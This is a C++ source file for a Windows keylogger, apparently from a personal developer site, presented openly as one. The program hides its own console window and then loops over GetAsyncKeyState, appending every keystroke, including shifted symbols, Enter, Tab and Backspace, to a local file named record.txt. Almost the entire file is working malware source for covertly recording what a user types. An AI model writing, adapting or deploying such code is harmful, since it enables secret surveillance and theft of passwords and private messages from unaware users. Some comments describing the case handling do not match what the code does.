/*######################################################################################
# Dev: cnd.dev
# Program Name: keylogger
# Version: 1.0.0.1
#  - Major.Minor.Update/BuildNumber
# Date: 201528OCT25
# Filename: keylogger.cpp
# Dependency: N/A
# Compile Cmd: g++ -m64 -O1 keylogger.c -o keylogger-v1.0.0-win-x86-64
# Synopsis:
#  - Overview: describes what the program does, how it works, and its key components
#  - Technical: ...
######################################################################################*/


#include <windows.h>
#include <winuser.h>
#include <fstream>
using namespace std;

void hideWindow() {
	HWND hiddenWindow;
	AllocConsole();
	hiddenWindow = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(hiddenWindow, 0);
}

void logging() {
	char key;

	while (true) {
		//Read US Keyboard ASCII Characters - currently set up to take uppercase NOT lowercase
		for (key = 8; key <= 127; key++) {
			// if key is pressed (from up to down)
			if (GetAsyncKeyState(key) == -32767) {
				//ios::app opens the file in append mode
				ofstream fileObject("record.txt", ios::app);

				//if shift key (left or right) is pressed AND uppercase A-Z is pressed, then capture the lowercase equivalent
				if ((key >= 65 && key <= 90) && !(GetAsyncKeyState(0x10))) {
					key += 32;   // change upper to lowercase
					fileObject << key;
					fileObject.flush();   //save every keystroke immediately
					break;
				}

				//if no shift key is pressed, then capture uppercase
				else if (key >= 65 && key <= 90) {
					fileObject << key;
					fileObject.flush();  //save every keystroke immediately
					break;
				}

				//
				else {
					switch (key) {
					case 48: {
						if (GetAsyncKeyState(0x10))
							fileObject << ")";
						else
							fileObject << "0";
						break;
					}
					case 49: {
						if (GetAsyncKeyState(0x10))
							fileObject << "!";
						else
							fileObject << "1";
						break;
					}
					case 50: {
						if (GetAsyncKeyState(0x10))
							fileObject << "@";
						else
							fileObject << "2";
						break;
					}
					case 51: {
						if (GetAsyncKeyState(0x10))
							fileObject << "#";
						else
							fileObject << "3";
						break;
					}
					case 52: {
						if (GetAsyncKeyState(0x10))
							fileObject << "$";
						else
							fileObject << "4";
						break;
					}
					case 53: {
						if (GetAsyncKeyState(0x10))
							fileObject << "%";
						else
							fileObject << "5";
						break;
					}
					case 54: {
						if (GetAsyncKeyState(0x10))
							fileObject << "^";
						else
							fileObject << "6";
						break;
					}
					case 55: {
						if (GetAsyncKeyState(0x10))
							fileObject << "&";
						else
							fileObject << "7";
						break;
					}
					case 56: {
						if (GetAsyncKeyState(0x10))
							fileObject << "*";
						else
							fileObject << "8";
						break;
					}
					case 57: {
						if (GetAsyncKeyState(0x10))
							fileObject << "(";
						else
							fileObject << "9";
						break;
					}

						   //VIRTUAL KEYS NAMED CONSTANTS IN WINDOWS API (windows.h/winuser.h)
					case VK_SPACE: {
						fileObject << " ";
						break;
					}
					case VK_RETURN: {
						fileObject << "\n";
						break;
					}
					case VK_TAB: {
						fileObject << "	";
						break;
					}
					case VK_BACK: {
						fileObject << "[BACKSPACE]";
						break;
					}
					case VK_ESCAPE: {
						fileObject << "[ESC]";
						break;
					}
					case VK_DELETE: {
						fileObject << "[DELETE]";
						break;
					}
					}
				}
			}
		}
	}
}

int main()
{
	hideWindow();
	logging();
	return 0;
}
